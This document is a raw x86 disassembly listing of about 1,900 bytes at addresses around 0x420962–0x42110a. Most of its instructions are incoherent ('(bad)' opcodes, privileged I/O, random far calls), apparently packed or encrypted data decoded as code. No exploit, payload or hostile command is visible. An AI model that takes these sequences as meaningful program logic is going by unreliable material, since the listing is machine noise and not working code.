  420962:	sahf   
  420963:	push   ebp
  420964:	cmp    eax,0x51e98648
  420969:	mov    ecx,0xafe1410
  42096e:	xchg   ebp,eax
  42096f:	pop    ss
  420970:	call   0x3c9e586a
  420975:	call   0x9d532a1a
  42097a:	(bad)  
  42097b:	dec    edi
  42097c:	adc    eax,esi
  42097e:	and    eax,0x3ed25144
  420983:	fisub  DWORD PTR [ebx+0x70]
  420986:	retf   
  420987:	test   BYTE PTR [esi-0x5f7e2d19],0xd9
  42098e:	jecxz  0x420a0f
  420990:	ficom  WORD PTR [ebx-0x5c]
  420993:	mov    eax,0x40
	...
  4209a8:	add    BYTE PTR [eax],al
  4209aa:	inc    esp
  4209ab:	dec    ebp
  4209ac:	dec    edx
  4209ad:	dec    ebx
  4209ae:	dec    ebx
  4209af:	dec    edi
  4209b0:	inc    ebp
  4209b1:	dec    edi
  4209b2:	sub    eax,0xbb04921e
  4209b7:	int    0x1f
  4209b9:	xor    bl,BYTE PTR [eax+ebx*4+0x6d30001]
  4209c0:	add    BYTE PTR [eax],al
  4209c2:	repz lahf 
  4209c4:	call   0x87f9:0x37cad2a0
  4209cb:	sbb    al,0xbf
  4209cd:	pop    edi
  4209ce:	cmp    eax,0x4a7932f0
  4209d3:	std    
  4209d4:	and    ah,BYTE PTR [edi+esi*8-0x38c749a0]
  4209db:	outs   dx,BYTE PTR ds:[esi]
  4209dc:	pop    edi
  4209dd:	mov    al,ds:0x99dd7494
  4209e2:	adc    BYTE PTR [ebp+0x7678d661],dl
  4209e8:	(bad)  
  4209e9:	or     al,BYTE PTR [edx+0x4f]
  4209ec:	dec    ebp
  4209ed:	and    eax,DWORD PTR [esi-0x76118249]
  4209f3:	int3   
  4209f4:	stos   BYTE PTR es:[edi],al
  4209f5:	mov    edi,0xed7d431e
  4209fa:	dec    esi
  4209fb:	scas   al,BYTE PTR es:[edi]
  4209fc:	lea    edx,[eax]
  4209fe:	cmp    eax,0xba0d87e1
  420a03:	mov    ebp,0xbcbd9ce3
  420a08:	aam    0xdc
  420a0a:	mov    BYTE PTR [edi+ecx*4],ch
  420a0d:	jbe    0x420a5e
  420a0f:	pushf  
  420a10:	pop    ds
  420a11:	test   BYTE PTR [esi],dl
  420a13:	jo     0x420a22
  420a15:	lea    ebp,[edx+0x1]
  420a18:	and    eax,0x1dd63ea8
  420a1d:	fdivr  DWORD PTR [ebp-0xd34de2d]
  420a23:	icebp  
  420a24:	ss aam 0x11
  420a27:	out    dx,eax
  420a28:	inc    ecx
  420a29:	sub    DWORD PTR [ebx],esp
  420a2b:	data16 adc dl,0x2d
  420a2f:	mov    esi,0x201bd961
  420a34:	cli    
  420a35:	mov    ebx,esp
  420a37:	sub    esi,ebx
  420a39:	rcr    BYTE PTR [esi-0x62],0x96
  420a3d:	push   es
  420a3e:	sub    ah,BYTE PTR [edx-0x4e]
  420a41:	dec    BYTE PTR [edi]
  420a43:	loopne 0x420aa3
  420a45:	mov    ebp,0x14cc1274
  420a4a:	xchg   esp,eax
  420a4b:	mov    edx,0xf6d232a8
  420a50:	or     dl,BYTE PTR [eax+0x1886873c]
  420a56:	bound  edi,QWORD PTR [ebp-0x1d]
  420a59:	inc    edi
  420a5a:	cld    
  420a5b:	test   ecx,ebx
  420a5d:	jno    0x4209ec
  420a5f:	pop    ecx
  420a60:	push   0xffffffc1
  420a62:	push   cs
  420a63:	lods   eax,DWORD PTR ds:[esi]
  420a64:	dec    ebx
  420a65:	out    0xed,eax
  420a67:	pop    ds
  420a68:	test   BYTE PTR [edx],bh
  420a6a:	cli    
  420a6b:	out    dx,eax
  420a6c:	xchg   ebx,eax
  420a6d:	pop    es
  420a6e:	sbb    ch,BYTE PTR [eax-0x50]
  420a71:	into   
  420a72:	in     eax,0x54
  420a74:	cmp    dl,BYTE PTR [ebp+0x25]
  420a77:	(bad)  
  420a78:	ss adc ecx,ecx
  420a7b:	sbb    ecx,DWORD PTR [edx]
  420a7d:	gs jge 0x420a08
  420a80:	mov    cl,0x67
  420a82:	mov    bh,0xab
  420a84:	adc    BYTE PTR [edx-0x4b],bl
  420a87:	dec    esi
  420a88:	mul    DWORD PTR [esi-0x70eb9175]
  420a8e:	mov    bl,0xdd
  420a90:	ret    0x5d9d
  420a93:	push   0xc29f06ee
  420a98:	pop    ecx
  420a99:	lods   eax,DWORD PTR ds:[esi]
  420a9a:	mov    eax,0x3743ac5f
  420a9f:	mov    al,0x55
  420aa1:	dec    ecx
  420aa2:	dec    esi
  420aa3:	fadd   DWORD PTR [ebx+0x5]
  420aa6:	inc    ebx
  420aa7:	or     bh,0x78
  420aaa:	or     DWORD PTR [edx],0xffffffc4
  420aad:	pop    ss
  420aae:	pop    eax
  420aaf:	inc    eax
  420ab0:	(bad)  
  420ab1:	xor    BYTE PTR [esi-0x2d],ch
  420ab4:	push   eax
  420ab5:	or     BYTE PTR [ecx],bh
  420ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ab8:	outs   dx,DWORD PTR ds:[esi]
  420ab9:	cmp    DWORD PTR [edx+eiz*4+0x69],edx
  420abd:	mov    bl,0xcc
  420abf:	js     0x420aef
  420ac1:	pop    eax
  420ac2:	sub    BYTE PTR [eax-0x16],bh
  420ac5:	xchg   DWORD PTR [ebp+0x46a9eedb],esi
  420acb:	sbb    DWORD PTR [edx],edx
  420acd:	jnp    0x420ac0
  420acf:	lea    ebp,ds:0xc5a97830
  420ad5:	inc    eax
  420ad6:	pop    ebp
  420ad7:	leave  
  420ad8:	fs pop ecx
  420ada:	fwait
  420adb:	data16 jmp 0x420b45
  420ade:	add    edx,edi
  420ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ae1:	pop    ecx
  420ae2:	push   esp
  420ae3:	sahf   
  420ae4:	mov    al,0xbb
  420ae6:	fist   WORD PTR [esi-0x74]
  420ae9:	shl    BYTE PTR [edi-0x3a101927],0x1e
  420af0:	inc    ebp
  420af1:	adc    BYTE PTR [ebp+0x6a1836c4],cl
  420af7:	inc    ebx
  420af8:	adc    ah,bh
  420afa:	rcr    BYTE PTR [eax+0x5b9ccf58],cl
  420b00:	push   edx
  420b01:	out    dx,al
  420b02:	mov    DWORD PTR [edi-0x73],eax
  420b05:	pop    ss
  420b06:	push   ebx
  420b07:	jge    0x420ad6
  420b09:	pop    ss
  420b0a:	jecxz  0x420b03
  420b0c:	add    DWORD PTR [ebp+0x77],0xffffffdc
  420b10:	pusha  
  420b11:	(bad)  
  420b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b14:	out    0x64,eax
  420b16:	bound  esi,QWORD PTR [ecx+0x50]
  420b19:	and    eax,0x44dc3def
  420b1e:	mov    al,0xfc
  420b20:	out    dx,al
  420b21:	jno    0x420b2a
  420b23:	push   ebx
  420b24:	and    cl,ch
  420b26:	jnp    0x420b26
  420b28:	leave  
  420b29:	mov    esi,0x5f3c61c1
  420b2e:	inc    esi
  420b2f:	dec    eax
  420b30:	mov    ch,0xbc
  420b32:	imul   esp,DWORD PTR [ecx],0x3866664
  420b38:	or     BYTE PTR [eax],bl
  420b3a:	daa    
  420b3b:	add    BYTE PTR [ebp+0x5243a942],al
  420b41:	xchg   ebp,eax
  420b42:	sahf   
  420b43:	and    eax,0x56a39cd7
  420b48:	fs jmp 0x4d57dee
  420b4e:	inc    ebx
  420b4f:	mov    eax,ds:0x4142baea
  420b54:	mov    edi,0xc1d44605
  420b59:	adc    BYTE PTR [eax-0x59],cl
  420b5c:	aaa    
  420b5d:	fbstp  TBYTE PTR [eax-0x392f7c56]
  420b63:	(bad)  
  420b64:	push   esp
  420b65:	sub    al,0x42
  420b67:	jne    0x420b3a
  420b69:	(bad)  
  420b6a:	pusha  
  420b6b:	mov    dh,al
  420b6d:	jl     0x420b55
  420b6f:	mov    ds:0xef7d84fe,eax
  420b74:	ret    
  420b75:	fdivr  DWORD PTR [edx]
  420b77:	add    DWORD PTR fs:[edx-0x12],eax
  420b7b:	pop    ebp
  420b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b7d:	mov    ds:0x97a48340,eax
  420b82:	pop    edx
  420b83:	jp     0x420b69
  420b85:	nop
  420b86:	jle    0x420b11
  420b88:	jle    0x420b55
  420b8a:	push   ebx
  420b8b:	pop    DWORD PTR [eax+0x76]
  420b8e:	push   cs
  420b8f:	and    al,0x0
  420b91:	les    eax,FWORD PTR [edx+ebp*2-0x4f626edf]
  420b98:	loop   0x420c02
  420b9a:	sahf   
  420b9b:	mov    eax,0x210b4cb
  420ba0:	cmp    eax,0x80241be6
  420ba5:	push   0xffffff94
  420ba7:	out    0xc5,eax
  420ba9:	push   edi
  420baa:	mov    cs,WORD PTR [eax+0x345f29ae]
  420bb0:	out    dx,al
  420bb1:	jbe    0x420bd2
  420bb3:	jmp    eax
  420bb5:	cdq    
  420bb6:	test   DWORD PTR [edi],ebx
  420bb8:	popa   
  420bb9:	mul    BYTE PTR [edi+edx*1-0x74aa3547]
  420bc0:	test   eax,0x8da7e3f6
  420bc5:	pop    ds
  420bc6:	ds loop 0x420c42
  420bc9:	aad    0x3
  420bcb:	xchg   ebx,eax
  420bcc:	inc    esi
  420bcd:	in     eax,dx
  420bce:	pop    ss
  420bcf:	or     ah,BYTE PTR [edi*1-0x41bad610]
  420bd6:	or     eax,0x8045a8eb
  420bdb:	popf   
  420bdc:	mov    al,0x8a
  420bde:	outs   dx,DWORD PTR ds:[esi]
  420bdf:	das    
  420be0:	aas    
  420be1:	and    al,0x4e
  420be3:	xor    eax,0x63710672
  420be8:	jb     0x420b6e
  420bea:	xchg   esi,ecx
  420bec:	and    dh,BYTE PTR [ebp+0x7b831f6a]
  420bf2:	in     eax,dx
  420bf3:	mov    WORD PTR [eax+edx*2-0x32],fs
  420bf7:	jge    0x420b80
  420bf9:	mov    ch,0xa9
  420bfb:	popw   es
  420bfd:	int    0x37
  420bff:	sbb    DWORD PTR [edi+ebx*2-0x3e756677],0x15af98ce
  420c0a:	cli    
  420c0b:	les    esi,FWORD PTR [ecx+0x48c2e0e1]
  420c11:	cmp    DWORD PTR [ecx-0x4d],ecx
  420c14:	addr16 jns 0x420c28
  420c17:	xchg   edx,eax
  420c18:	outs   dx,BYTE PTR ds:[esi]
  420c19:	mov    esi,0xc94c4f29
  420c1e:	sub    al,0xaa
  420c20:	outs   dx,DWORD PTR ds:[esi]
  420c21:	mov    WORD PTR [ebx+0x32],es
  420c24:	sub    eax,0xe042cf4e
  420c29:	cmp    DWORD PTR [ebx],ebp
  420c2b:	pop    esp
  420c2c:	dec    edx
  420c2d:	inc    ebx
  420c2e:	mov    ebx,0x6d407450
  420c33:	aas    
  420c34:	xchg   esi,eax
  420c35:	inc    ecx
  420c36:	cmp    ecx,DWORD PTR [esi]
  420c38:	jg     0x420c6d
  420c3a:	fimul  WORD PTR [ebx]
  420c3c:	ret    0x55ca
  420c3f:	jg     0x420c5a
  420c41:	sub    eax,0x21d4eb00
  420c46:	jae    0x420c0d
  420c48:	pusha  
  420c49:	cdq    
  420c4a:	pop    ss
  420c4b:	xor    eax,0x4a07458b
  420c50:	out    0xa4,eax
  420c52:	add    BYTE PTR [ecx+edi*8-0x1b49c820],dl
  420c59:	fcmove st,st(3)
  420c5b:	xchg   ebp,eax
  420c5c:	push   edx
  420c5d:	or     DWORD PTR [edi-0x7af88aa9],0xffffffa9
  420c64:	outs   dx,BYTE PTR ds:[esi]
  420c65:	xor    bl,dl
  420c67:	clc    
  420c68:	jnp    0x420c32
  420c6a:	mov    al,0xed
  420c6c:	arpl   WORD PTR [edi+0x57],dx
  420c6f:	test   al,0xb6
  420c71:	lods   eax,DWORD PTR ds:[esi]
  420c72:	push   esp
  420c73:	mov    eax,0x3cded790
  420c78:	test   BYTE PTR [ecx-0x615083f6],0xbb
  420c7f:	push   edx
  420c80:	aad    0x96
  420c82:	sbb    dh,cl
  420c84:	shl    DWORD PTR [edx-0x7ada935e],0xd3
  420c8b:	fs gs pop ecx
  420c8e:	mov    edx,DWORD PTR [edx-0x4897c2fe]
  420c94:	ss mov si,0x4cd
  420c99:	jae    0x420ce1
  420c9b:	loope  0x420c8f
  420c9d:	stc    
  420c9e:	sti    
  420c9f:	imul   BYTE PTR [eax+0x705c8f30]
  420ca5:	vmovntdq XMMWORD PTR [edx],xmm6
  420ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420caa:	pop    ebx
  420cab:	mov    dl,0x65
  420cad:	sbb    eax,0xae0e0e19
  420cb2:	imul   edx,DWORD PTR ds:0x3c135ab5,0x51c97ddf
  420cbc:	xchg   DWORD PTR ds:0xa690cfd2,esi
  420cc2:	cdq    
  420cc3:	add    eax,ebx
  420cc5:	sahf   
  420cc6:	rcr    esi,cl
  420cc8:	mov    bh,0x46
  420cca:	(bad)  
  420ccb:	lea    ebp,[esi]
  420ccd:	lods   al,BYTE PTR ds:[esi]
  420cce:	inc    esp
  420ccf:	xchg   DWORD PTR [esi-0x56d6613],eax
  420cd5:	sub    ebp,edx
  420cd7:	cmp    al,0x5a
  420cd9:	xchg   ebp,eax
  420cda:	or     DWORD PTR [ebp+0x62],eax
  420cdd:	or     eax,0xd363603e
  420ce2:	mov    bl,0x51
  420ce4:	jo     0x420d46
  420ce6:	retf   0x1d93
  420ce9:	jbe    0x420d4d
  420ceb:	cwde   
  420cec:	fmulp  st(4),st
  420cee:	std    
  420cef:	xchg   cl,ch
  420cf1:	push   cs
  420cf2:	pushf  
  420cf3:	sub    ch,dh
  420cf5:	scas   eax,DWORD PTR es:[edi]
  420cf6:	push   ebp
  420cf7:	jge    0x420d52
  420cf9:	fdivp  st(4),st
  420cfb:	test   BYTE PTR [ebp+edi*4+0x3c8257a8],bh
  420d02:	pop    ebx
  420d03:	cld    
  420d04:	sbb    DWORD PTR [esi+0x61],edi
  420d07:	dec    esp
  420d08:	gs cmc 
  420d0a:	jbe    0x420d10
  420d0c:	nop
  420d0d:	jg     0x420d4e
  420d0f:	xchg   ebp,eax
  420d10:	shl    dh,cl
  420d12:	retf   0x56ec
  420d15:	push   DWORD PTR [ebx+0x1e]
  420d18:	je     0x420ce2
  420d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d1b:	ins    BYTE PTR es:[edi],dx
  420d1c:	sub    BYTE PTR [eax-0x30],bh
  420d1f:	mov    ecx,0xc81f0b23
  420d24:	test   DWORD PTR [ecx],ebp
  420d26:	xchg   ebp,eax
  420d27:	das    
  420d28:	call   0x8962037c
  420d2d:	stos   DWORD PTR es:[edi],eax
  420d2e:	xchg   DWORD PTR [ebx-0x456cc824],ebx
  420d34:	add    dl,BYTE PTR [edx-0x3543d8b]
  420d3a:	les    edi,FWORD PTR [ebx]
  420d3c:	adc    DWORD PTR [edi+ecx*1],0x8a8e38ab
  420d43:	je     0x420ce6
  420d45:	xor    BYTE PTR [eax-0x56],cl
  420d48:	pop    eax
  420d49:	mov    ah,0x8d
  420d4b:	test   DWORD PTR [ecx+ecx*2+0x3570bd06],0x3b6a1c9b
  420d56:	lods   eax,DWORD PTR ds:[esi]
  420d57:	xchg   esi,ebp
  420d59:	shr    BYTE PTR es:[ebp+0x6b],0x18
  420d5e:	pop    edi
  420d5f:	inc    ebx
  420d60:	imul   esp,DWORD PTR [edx+0x41960a29],0xf8da27a8
  420d6a:	adc    DWORD PTR [ecx+0x15],eax
  420d6d:	inc    ecx
  420d6e:	mov    bh,0xd3
  420d70:	pop    esp
  420d71:	rcl    DWORD PTR [ebx+ebp*4],0xe1
  420d75:	out    dx,eax
  420d76:	loopne 0x420dd6
  420d78:	sti    
  420d79:	sub    al,0x3c
  420d7b:	sbb    eax,0x24d41bc
  420d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d81:	sahf   
  420d82:	outs   dx,DWORD PTR ds:[esi]
  420d83:	sub    ch,BYTE PTR [ebx]
  420d85:	aaa    
  420d86:	xchg   edi,eax
  420d87:	in     al,0x93
  420d89:	(bad)  [eax]
  420d8b:	dec    ebp
  420d8c:	cmp    esi,DWORD PTR [edx+0x33]
  420d8f:	or     edi,DWORD PTR [esi+0x5b961b8f]
  420d95:	xor    edi,edx
  420d97:	adc    al,0xf6
  420d99:	les    esi,FWORD PTR [esi+ecx*2+0x6260fd1c]
  420da0:	int    0xbf
  420da2:	ret    
  420da3:	sub    al,0x40
  420da5:	xchg   ecx,eax
  420da6:	gs xchg ebx,eax
  420da8:	adc    BYTE PTR [edx],bl
  420daa:	cdq    
  420dab:	call   FWORD PTR [edx+0xe31d34]
  420db1:	push   eax
  420db2:	inc    edx
  420db3:	mov    ds:0xd13bb346,eax
  420db8:	sbb    BYTE PTR [esi-0x570b4cb5],0x14
  420dbf:	lods   al,BYTE PTR ds:[esi]
  420dc0:	cmp    DWORD PTR es:[ebx+0x65b780a7],ecx
  420dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dc8:	xchg   edi,eax
  420dc9:	test   al,0xc9
  420dcb:	lds    edx,FWORD PTR [edi-0x20]
  420dce:	mov    ds:0x8abea7da,al
  420dd3:	sar    DWORD PTR [ecx-0x79],cl
  420dd6:	dec    ebp
  420dd7:	inc    ebp
  420dd9:	adc    BYTE PTR [edx-0x37],dh
  420ddc:	out    0xd7,al
  420dde:	and    al,0x49
  420de0:	sub    al,0x92
  420de2:	jae    0x420d9a
  420de4:	cdq    
  420de5:	test   DWORD PTR [edx+0x7c],eax
  420de8:	pop    ss
  420de9:	hlt    
  420dea:	jle    0x420dbd
  420dec:	push   eax
  420ded:	mov    ecx,0x6f6bc28a
  420df2:	ds sbb al,0x56
  420df5:	and    ah,ah
  420df7:	fcomp  DWORD PTR [eax]
  420df9:	arpl   si,ax
  420dfb:	inc    edx
  420dfc:	ins    DWORD PTR es:[edi],dx
  420dfd:	and    esi,ecx
  420dff:	aas    
  420e00:	jecxz  0x420e6e
  420e02:	das    
  420e03:	fisttp DWORD PTR [edi]
  420e05:	add    ch,BYTE PTR [edx+0x622aacc0]
  420e0b:	sub    BYTE PTR [eax+0x413bde4a],dl
  420e11:	int3   
  420e12:	cmp    DWORD PTR [ebx-0x36],edx
  420e15:	xor    DWORD PTR [ebp+0x5ebd8345],esi
  420e1b:	jo     0x420db0
  420e1d:	(bad)  
  420e1e:	fld    QWORD PTR [eax-0x50e4206d]
  420e24:	loopne 0x420e10
  420e26:	nop
  420e27:	(bad)  
  420e28:	and    BYTE PTR [di],bl
  420e2b:	jmp    0x192:0xe104
  420e31:	iret   
  420e32:	adc    ah,BYTE PTR [ebx]
  420e34:	sti    
  420e35:	dec    ecx
  420e36:	fld    QWORD PTR ds:0x55f8c2a7
  420e3c:	imul   ebp,DWORD PTR [eax],0x7110e7f4
  420e42:	sbb    cl,dh
  420e44:	pop    edx
  420e45:	call   0x97e2:0x37bd4bc5
  420e4c:	jmp    0x99d7d976
  420e51:	push   eax
  420e52:	aad    0xf2
  420e54:	in     al,dx
  420e55:	jae    0x420ece
  420e57:	cs dec ecx
  420e59:	retf   
  420e5a:	mov    ah,0x98
  420e5c:	adc    BYTE PTR [ebx],al
  420e5e:	mov    eax,ds:0x889227a7
  420e63:	jle    0x420ede
  420e65:	or     esp,DWORD PTR [ebp-0x26]
  420e68:	je     0x420e57
  420e6a:	sub    BYTE PTR [eax-0x12],dh
  420e6d:	pushf  
  420e6e:	pushf  
  420e6f:	adc    eax,0x57a6e623
  420e74:	lea    esi,[esi+ecx*8-0x30]
  420e78:	das    
  420e79:	fcom   DWORD PTR [ebp-0x79829aac]
  420e7f:	mov    bh,0x2e
  420e81:	(bad)  
  420e82:	push   edx
  420e83:	call   0xf381:0xc4d62fe6
  420e8a:	inc    edi
  420e8b:	dec    ebp
  420e8c:	les    eax,FWORD PTR es:[edx-0x78]
  420e90:	test   eax,0x410643e8
  420e95:	inc    eax
  420e96:	and    BYTE PTR ds:0x8dafb91a,ch
  420e9c:	fcomp  QWORD PTR [esi+0x446c9fc1]
  420ea2:	jnp    0x420e8c
  420ea4:	into   
  420ea5:	out    dx,al
  420ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ea7:	out    0x7e,al
  420ea9:	test   cl,bl
  420eab:	mov    esi,0xa89741d3
  420eb0:	cli    
  420eb1:	(bad)  
  420eb2:	pushf  
  420eb3:	dec    edi
  420eb4:	adc    eax,0x67c8ef74
  420eb9:	fadd   DWORD PTR [edi]
  420ebb:	arpl   WORD PTR [eax+0x6d9d58f4],bx
  420ec1:	add    esi,DWORD PTR [edx]
  420ec3:	dec    eax
  420ec4:	pop    ebx
  420ec5:	out    dx,eax
  420ec6:	(bad)  
  420ec8:	ds dec ebp
  420eca:	cmp    al,0x91
  420ecc:	push   ds
  420ecd:	lahf   
  420ece:	jg     0x420eb6
  420ed0:	aas    
  420ed1:	in     eax,0x2a
  420ed3:	call   0x4bc12486
  420ed8:	mov    edx,0xeccecbe5
  420edd:	jp     0x420e97
  420edf:	sbb    eax,0x527e6ede
  420ee4:	pop    ds
  420ee5:	xor    al,cl
  420ee7:	(bad)  
  420ee8:	jb     0x420f2c
  420eea:	popa   
  420eeb:	push   edi
  420eec:	mov    ds:0x642d9b6d,al
  420ef1:	dec    edx
  420ef2:	pop    esp
  420ef3:	inc    esp
  420ef4:	cmp    BYTE PTR [ebx+0x76aa5ec0],cl
  420efa:	dec    esp
  420efb:	push   ebp
  420efc:	sub    DWORD PTR [esp+edx*2],esi
  420eff:	retf   
  420f00:	sbb    dh,ah
  420f02:	cmp    BYTE PTR [eax+0x560c5c3b],ah
  420f08:	adc    edx,DWORD PTR [ecx-0x28]
  420f0b:	mov    BYTE PTR [ecx-0x7cc05ad9],dh
  420f11:	jne    0x420f46
  420f13:	gs dec ecx
  420f15:	(bad)  
  420f16:	adc    ch,BYTE PTR [edi]
  420f18:	repnz outs dx,BYTE PTR ds:[esi]
  420f1a:	ficom  WORD PTR [ebx-0x48]
  420f1d:	sub    ah,BYTE PTR [eax-0x7752bb36]
  420f23:	jno    0x420f7f
  420f25:	jp     0x420f2b
  420f27:	repnz fstp st(7)
  420f2a:	add    eax,0xab2afae0
  420f2f:	aam    0x9
  420f31:	rdtsc  
  420f33:	stos   DWORD PTR es:[edi],eax
  420f34:	sbb    dl,BYTE PTR [ebx+esi*4]
  420f37:	jmp    0x420f80
  420f39:	enter  0xd188,0x3f
  420f3d:	pop    ecx
  420f3e:	clc    
  420f3f:	and    edi,DWORD PTR [eax+0x59]
  420f42:	sub    DWORD PTR [ebx],edi
  420f44:	jo     0x420eeb
  420f46:	scas   al,BYTE PTR es:[edi]
  420f47:	and    DWORD PTR [ecx],eax
  420f49:	sbb    ebx,edi
  420f4b:	and    al,0xaf
  420f4d:	xchg   edx,eax
  420f4e:	fild   DWORD PTR [ebx-0x1a]
  420f51:	cmp    eax,edx
  420f53:	fadd   st(3),st
  420f55:	sbb    eax,DWORD PTR [edi]
  420f57:	or     esi,ecx
  420f59:	test   ebx,esi
  420f5b:	sub    cl,dh
  420f5d:	popa   
  420f5e:	stos   DWORD PTR es:[edi],eax
  420f5f:	and    bl,0x9d
  420f62:	push   eax
  420f63:	xchg   esi,eax
  420f64:	push   0xa84a5c50
  420f69:	test   BYTE PTR [eax+0x7f6c6e52],ah
  420f6f:	pop    edi
  420f70:	mov    bl,0x6
  420f72:	outs   dx,DWORD PTR ds:[esi]
  420f73:	mov    bh,0xcf
  420f75:	jg     0x420f90
  420f77:	jb     0x420f18
  420f79:	mov    BYTE PTR [edi-0x70624fe4],cl
  420f7f:	mov    dl,0xd7
  420f81:	sar    BYTE PTR ds:0x311dc1c3,1
  420f87:	aas    
  420f88:	mov    ecx,0x20f27981
  420f8d:	sbb    eax,0x5f88f410
  420f92:	lods   eax,DWORD PTR ds:[esi]
  420f93:	mov    ecx,0xdcb38f7a
  420f98:	inc    ecx
  420f99:	in     eax,0x2f
  420f9b:	xlat   BYTE PTR ss:[ebx]
  420f9d:	test   ebx,ebx
  420f9f:	xor    eax,0x94aaf6bc
  420fa4:	push   cs
  420fa5:	out    dx,al
  420fa6:	inc    eax
  420fa7:	fdivr  QWORD PTR [ecx-0x19]
  420faa:	cmp    al,0x3d
  420fac:	inc    esp
  420fad:	int    0x69
  420faf:	sub    eax,0xa0fa8eef
  420fb4:	xchg   edx,eax
  420fb5:	shl    BYTE PTR [ecx-0x2b],1
  420fb8:	mov    ds:0xbf75df98,al
  420fbd:	cmp    bh,BYTE PTR [eax-0x81622ee]
  420fc3:	sbb    al,ch
  420fc5:	pop    edx
  420fc6:	xchg   edi,eax
  420fc7:	lods   eax,DWORD PTR ds:[esi]
  420fc8:	mov    dl,0x1c
  420fca:	adc    eax,0x3c4e5e01
  420fcf:	sahf   
  420fd0:	xchg   BYTE PTR [edi+0x43],al
  420fd3:	imul   esi,DWORD PTR [ebp-0x5fd1cce9],0x5aebdc3e
  420fdd:	xchg   ebp,eax
  420fde:	hlt    
  420fdf:	leave  
  420fe0:	scas   al,BYTE PTR es:[edi]
  420fe1:	jno    0x42105b
  420fe3:	nop
  420fe4:	test   eax,0x92efbafb
  420fe9:	imul   esp,ecx,0x67
  420fec:	push   esp
  420fed:	ins    DWORD PTR es:[edi],dx
  420fee:	pop    ss
  420fef:	clc    
  420ff0:	outs   dx,BYTE PTR ds:[esi]
  420ff1:	adc    cl,ah
  420ff3:	push   es
  420ff4:	push   ss
  420ff5:	cld    
  420ff6:	push   0xffffffc9
  420ff8:	xlat   BYTE PTR ds:[ebx]
  420ff9:	xchg   esp,eax
  420ffa:	mov    DWORD PTR [edx+edi*8+0x196018a8],ebp
  421001:	ds xchg cx,ax
  421004:	sub    BYTE PTR [ebx-0x29],al
  421007:	inc    ebp
  421008:	mov    bh,0x1a
  42100a:	test   DWORD PTR [ebx+0x5f],esp
  42100d:	sub    BYTE PTR [ebx+0x4d],bl
  421010:	retf   
  421011:	ret    0x327
  421014:	shl    BYTE PTR [ebp+0x6a],1
  421017:	pop    ecx
  421018:	xor    edi,DWORD PTR [eax-0x69]
  42101b:	mov    ds:0x27e961aa,al
  421020:	adc    DWORD PTR [ebx],edx
  421022:	adc    ecx,DWORD PTR [ebp+0x2bbd00e2]
  421028:	int    0xf9
  42102a:	add    ah,BYTE PTR [edi]
  42102c:	(bad)  
  42102d:	jno    0x420fef
  42102f:	mov    dh,0x41
  421031:	adc    al,0x5
  421033:	aaa    
  421034:	je     0x420fb6
  421036:	repz mov dl,0x0
  421039:	stos   BYTE PTR es:[edi],al
  42103a:	jb     0x420feb
  42103c:	cs mov dh,al
  42103f:	sbb    ecx,eax
  421041:	inc    esi
  421042:	dec    ecx
  421043:	(bad)  
  421044:	sbb    BYTE PTR [ecx+0x44],bh
  421047:	shr    edx,cl
  421049:	imul   eax,DWORD PTR [eax+edi*4],0x4
  42104d:	test   BYTE PTR [eax+eiz*4-0x66e87eba],dl
  421054:	or     ebp,ecx
  421056:	pop    ss
  421057:	mov    WORD PTR es:[ecx-0x1c9f4458],es
  42105e:	retf   
  42105f:	lds    ebx,FWORD PTR [eax]
  421061:	cwde   
  421062:	fsub   DWORD PTR [esi+0x2c]
  421065:	adc    edx,DWORD PTR [ecx+0xb]
  421068:	fwait
  421069:	mov    al,ds:0x81582b0
  42106e:	xchg   edx,eax
  42106f:	dec    eax
  421070:	popa   
  421071:	mov    ss,WORD PTR [ebx]
  421073:	fucompp 
  421075:	stos   BYTE PTR es:[edi],al
  421076:	fbld   TBYTE PTR [edi-0x5a7917ec]
  42107c:	nop
  42107d:	in     eax,dx
  42107e:	pop    ecx
  42107f:	cdq    
  421080:	in     eax,0xfe
  421082:	sti    
  421083:	pop    es
  421084:	out    dx,al
  421085:	lds    ebp,FWORD PTR ds:0xe4ce8125
  42108b:	outs   dx,BYTE PTR ds:[esi]
  42108c:	mov    DWORD PTR [eax-0x31d7e09e],edi
  421092:	inc    esi
  421093:	cli    
  421094:	xor    al,0x0
	...
  4210aa:	push   ebp
  4210ab:	dec    eax
  4210ac:	inc    edx
  4210ad:	push   ebp
  4210ae:	pop    edi
  4210af:	pop    edi
  4210b0:	push   edi
  4210b1:	dec    eax
  4210b2:	cmp    BYTE PTR [esi-0x14],bh
  4210b5:	or     bl,BYTE PTR [esi-0xa]
  4210b8:	mov    esi,DWORD PTR [ecx]
  4210ba:	outs   dx,DWORD PTR ds:[esi]
  4210bb:	lahf   
  4210bc:	add    DWORD PTR [eax],eax
  4210be:	rol    DWORD PTR [esi],cl
  4210c0:	add    BYTE PTR [eax],al
  4210c2:	mov    ah,0xb
  4210c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210c5:	frstor ds:0x68a331ae
  4210cb:	add    eax,0x26a243fb
  4210d0:	ins    DWORD PTR es:[edi],dx
  4210d1:	push   eax
  4210d2:	aaa    
  4210d3:	sar    DWORD PTR [esp+ecx*2+0x2a],cl
  4210d7:	xchg   ecx,eax
  4210d8:	and    BYTE PTR [edi+esi*1+0x6ef52bcc],bh
  4210df:	mov    al,ds:0x3b847e1c
  4210e5:	inc    edi
  4210e6:	push   es
  4210e7:	mov    ebx,ebp
  4210e9:	rol    BYTE PTR [edx+0x3e],0x85
  4210ed:	xchg   edi,eax
  4210ee:	js     0x4210bc
  4210f0:	add    al,0xed
  4210f2:	mov    ds:0xacfb6dd2,eax
  4210f7:	jge    0x4210c2
  4210f9:	imul   esp,DWORD PTR [ebx-0x505213aa],0x14
  421100:	pop    ecx
  421101:	inc    ecx
  421102:	xlat   BYTE PTR ds:[ebx]
  421103:	lahf   
  421104:	outs   dx,BYTE PTR ds:[esi]
  421105:	sbb    edi,DWORD PTR [esi]
  421107:	or     DWORD PTR [eax],ebp
  421109:	in     al,dx
  42110a:	sub    al,0xed
